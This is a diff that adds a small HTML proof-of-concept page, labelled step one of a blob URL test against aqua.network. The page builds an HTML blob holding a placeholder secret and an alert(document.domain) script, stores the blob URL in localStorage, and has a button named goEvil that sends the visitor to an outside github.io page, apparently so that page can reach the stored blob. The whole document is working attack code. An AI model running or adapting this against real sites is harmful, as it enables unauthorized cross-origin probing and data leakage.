@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Blob Create - aqua.network</title></head>
+<body style="background:#111;color:#0f0;font-family:monospace;padding:15px">
+<h2>STEP 1 - Create Blob di aqua.network</h2>
+<pre id=log></pre>
+<button onclick="createBlob()" style="padding:14px;width:100%;background:#0f0">1. Create Blob URL</button>
+<button onclick="goEvil()" style="padding:14px;width:100%;background:#0f0;margin-top:6px">2. Go to 0x403for test</button>
+<script>
+let blobUrl=null;
+function log(t){document.getElementById('log').textContent+=t+'\n'}
+function createBlob(){
+  let blob=new Blob([`<h1>SECRET GDNXOLVF...7DS3PQZY from aqua.network</h1><script>alert(document.domain)<\/script>`],{type:'text/html'});
+  blobUrl=URL.createObjectURL(blob);
+  localStorage.setItem('aqua_blob_url',blobUrl);
+  localStorage.setItem('wc:blob-test',blobUrl);
+  log('Blob: '+blobUrl+' saved to localStorage');
+}
+function goEvil(){location.href='https://0x403for.github.io/blob-test.html'}
+</script>
+</body>
+</html>
